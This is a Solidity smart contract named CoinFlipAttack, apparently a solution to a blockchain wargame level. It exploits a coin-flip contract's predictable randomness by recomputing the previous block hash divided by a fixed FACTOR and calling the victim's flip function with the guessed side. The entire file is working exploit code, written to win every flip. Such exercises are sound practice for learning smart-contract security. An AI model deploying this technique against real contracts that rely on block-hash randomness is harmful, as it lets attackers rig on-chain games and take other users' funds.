// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Coinflip.sol";

contract CoinFlipAttack {
    CoinFlip public victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool public side;

    constructor(address victimAddress) public {
        victimContract = CoinFlip(victimAddress);
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
        side = coinFlip == 1 ? true : false;

        victimContract.flip(side);

  }
}

